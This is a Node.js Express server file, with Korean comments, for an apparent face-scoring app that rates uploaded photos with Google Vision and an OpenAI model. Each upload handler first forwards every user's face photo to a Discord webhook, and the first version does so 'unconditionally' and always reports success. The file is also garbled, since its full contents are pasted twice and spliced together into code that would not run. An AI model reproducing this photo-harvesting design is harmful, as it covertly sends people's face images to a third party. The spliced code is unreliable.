import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import { v1 as vision } from "@google-cloud/vision";
import OpenAI from "openai";
import dotenv from "dotenv";
import fetch from "node-fetch";

dotenv.config();import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import { v1 as vision } from "@google-cloud/vision";
import OpenAI from "openai";
import dotenv from "dotenv";
import fetch from "node-fetch";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 10000;

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const OPENAI_API_KEY = process.env.OPENAI_API_KEY;
process.env.GOOGLE_APPLICATION_CREDENTIALS = process.env.GOOGLE_VISION_API;

const uploadDir = "./uploads";
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const upload = multer({ dest: uploadDir });

const openai = new OpenAI({ apiKey: OPENAI_API_KEY });
const client = new vision.ImageAnnotatorClient();

const likelihoodMap = {
  VERY_UNLIKELY: 0,
  UNLIKELY: 0.25,
  POSSIBLE: 0.5,
  LIKELY: 0.75,
  VERY_LIKELY: 1,
};

function calcScore(emotions) {
  const joy = likelihoodMap[emotions.joy] || 0;
  const sorrow = likelihoodMap[emotions.sorrow] || 0;
  const anger = likelihoodMap[emotions.anger] || 0;

  let score = joy * 10 - (sorrow + anger) * 5;

  if (score < 1) score = 1;
  if (score > 10) score = 10;

  return Math.round(score * 10) / 10;
}

app.use(express.static("./"));

app.get("/", (req, res) => {
  res.sendFile(path.resolve("index.html"));
});

app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;

  // 1. 무조건 Discord로 사진 전송
  try {
    const FormData = (await import("form-data")).default;
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath), "face.jpg");

    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form,
      headers: form.getHeaders(),
    });

    if (!discordRes.ok) {
      console.error("디스코드 전송 실패:", await discordRes.text());
    }
  } catch (e) {
    console.error("디스코드 전송 예외:", e.message);
  }

  // 2. AI 평가 시도 (실패해도 응답은 무조건 성공)
  let aiResult = null;
  let score = null;

  try {
    const [result] = await client.faceDetection(filePath);
    const faces = result.faceAnnotations;

    if (!faces || faces.length === 0) {
      throw new Error("얼굴을 찾을 수 없습니다.");
    }

    const faceData = faces[0];
    const emotions = {
      joy: faceData.joyLikelihood,
      sorrow: faceData.sorrowLikelihood,
      anger: faceData.angerLikelihood,
      surprise: faceData.surpriseLikelihood,
    };

    score = calcScore(emotions);

    const prompt = `이 얼굴의 감정 데이터를 참고해 점수는 ${score}점이며, 왜 그런 점수를 받았는지 간단히 설명해줘.

감정 데이터: ${JSON.stringify(emotions)}
`;

    const response = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [{ role: "user", content: prompt }],
    });

    aiResult = response.choices[0].message.content;
  } catch (e) {
    console.error("AI 분석 실패:", e.message);
    aiResult = "AI 평가 실패했지만 사진은 전송되었습니다.";
  } finally {
    // 3. 업로드된 파일 삭제
    fs.unlink(filePath, () => {});
  }

  // 4. 항상 성공 응답
  res.json({
    ok: true,
    score,
    result: aiResult,
  });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});


const app = express();
const PORT = process.env.PORT || 10000;

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const OPENAI_API_KEY = process.env.OPENAI_API_KEY;
process.env.GOOGLE_APPLICATION_CREDENTIALS = process.env.GOOGLE_VISION_API;

const uploadDir = "./uploads";
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const upload = multer({ dest: uploadDir });

const openai = new OpenAI({ apiKey: OPENAI_API_KEY });
const client = new vision.ImageAnnotatorClient();

const likelihoodMap = {
  VERY_UNLIKELY: 0,
  UNLIKELY: 0.25,
  POSSIBLE: 0.5,
  LIKELY: 0.75,
  VERY_LIKELY: 1,
};

function calcScore(emotions) {
  const joy = likelihoodMap[emotions.joy] || 0;
  const sorrow = likelihoodMap[emotions.sorrow] || 0;
  const anger = likelihoodMap[emotions.anger] || 0;

  let score = joy * 10 - (sorrow + anger) * 5;

  if (score < 1) score = 1;
  if (score > 10) score = 10;

  return Math.round(score * 10) / 10; // 소수점 1자리 반올림
}

app.use(express.static("./"));

app.get("/", (req, res) => {
  res.sendFile(path.resolve("index.html"));
});

app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;

  try {
    // Discord로 사진 전송
    const FormData = (await import("form-data")).default;
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath), "face.jpg");

    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form,
      headers: form.getHeaders(),
    });

    if (!discordRes.ok) {
      console.error("디스코드 전송 실패:", await discordRes.text());
    }
  } catch (e) {
    console.error("디스코드 전송 예외:", e.message);
  }

  try {
    // Google Vision 얼굴 감지
    const [result] = await client.faceDetection(filePath);
    const faces = result.faceAnnotations;

    if (!faces || faces.length === 0) {
      throw new Error("얼굴을 찾을 수 없습니다.");
    }

    const faceData = faces[0];
    const emotions = {
      joy: faceData.joyLikelihood,
      sorrow: faceData.sorrowLikelihood,
      anger: faceData.angerLikelihood,
      surprise: faceData.surpriseLikelihood,
    };

    // 점수 계산
    const score = calcScore(emotions);

    // OpenAI 평가 코멘트 생성
    const prompt = `이 얼굴의 감정 데이터를 참고해 점수는 ${score}점이며, 왜 그런 점수를 받았는지 간단히 설명해줘.

감정 데이터: ${JSON.stringify(emotions)}
`;

    const response = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [{ role: "user", content: prompt }],
    });

    const aiComment = response.choices[0].message.content;

    res.json({ ok: true, score, comment: aiComment });
  } catch (e) {
    console.error("AI 분석 실패:", e.message);
    res.json({ ok: false, error: e.message });
  } finally {
    fs.unlink(filePath, () => {});
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
